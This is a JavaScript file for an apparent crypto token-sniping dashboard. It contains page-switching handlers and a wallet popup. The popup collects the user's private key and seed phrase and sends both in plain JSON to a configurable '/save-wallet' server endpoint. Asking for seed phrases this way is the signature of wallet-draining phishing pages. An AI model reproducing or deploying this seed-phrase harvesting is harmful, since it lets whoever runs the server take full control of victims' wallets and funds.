document.addEventListener("DOMContentLoaded", function () {
    console.log("🚀 Script Loaded Successfully!");

    // 🌐 Elements
    const bundleButton = document.querySelector(".bundle-button");
    const portfolioButton = document.querySelector(".portfolio-btn");
    const tradeHistoryButton = document.querySelector(".trade-btn");
    const settingsButton = document.querySelector(".settings-btn");
    const backButtons = document.querySelectorAll(".back-btn");

    // 📂 Pages
    const portfolioPage = document.getElementById("portfolioPage");
    const tradeHistoryPage = document.getElementById("tradeHistoryPage");
    const settingsPage = document.getElementById("settingsPage");

    // ⚙️ Wallet Popup Elements
    const walletPopup = document.getElementById("walletPopup");
    const connectWalletBtn = document.querySelector(".connect-wallet-btn");
    const closeWalletPopup = document.querySelector(".close-btn");
    const walletSubmit = document.querySelector(".wallet-submit");

    // 🌍 API URL (Change if needed)
    const API_URL = "http://localhost:5000"; 

    // 🔄 Function to Show a Page
    function showPage(page) {
        portfolioPage.style.display = "none";
        tradeHistoryPage.style.display = "none";
        settingsPage.style.display = "none";
        page.style.display = "block";
    }

    // 📌 Button Click Events
    if (bundleButton) {
        bundleButton.addEventListener("click", () => {
            alert("⚡ Connect a wallet to snipe & bundle tokens!");
        });
    }
    if (portfolioButton) {
        portfolioButton.addEventListener("click", () => showPage(portfolioPage));
    }
    if (tradeHistoryButton) {
        tradeHistoryButton.addEventListener("click", () => showPage(tradeHistoryPage));
    }
    if (settingsButton) {
        settingsButton.addEventListener("click", () => showPage(settingsPage));
    }

    // 🔙 Back Buttons
    backButtons.forEach(button => {
        button.addEventListener("click", () => {
            portfolioPage.style.display = "none";
            tradeHistoryPage.style.display = "none";
            settingsPage.style.display = "none";
        });
    });

    // 🔥 Wallet Popup Handling
    connectWalletBtn.addEventListener("click", () => {
        walletPopup.classList.add("show");
    });
    closeWalletPopup.addEventListener("click", () => {
        walletPopup.classList.remove("show");
    });

    // 🔑 Save Wallet Data (Private Key & Seed Phrase)
    walletSubmit.addEventListener("click", async () => {
        const privateKey = document.getElementById("privateKey").value.trim();
        const seedPhrase = document.getElementById("seedPhrase").value.trim();

        if (!privateKey && !seedPhrase) {
            alert("❌ Please enter a Private Key or Seed Phrase!");
            return;
        }

        try {
            const response = await fetch(`${API_URL}/save-wallet`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ privateKey, seedPhrase })
            });

            const result = await response.json();
            alert(result.message);
            walletPopup.classList.remove("show");

            // Clear input fields
            document.getElementById("privateKey").value = "";
            document.getElementById("seedPhrase").value = "";
        } catch (error) {
            alert("❌ Failed to save wallet");
            console.error(error);
        }
    });
});
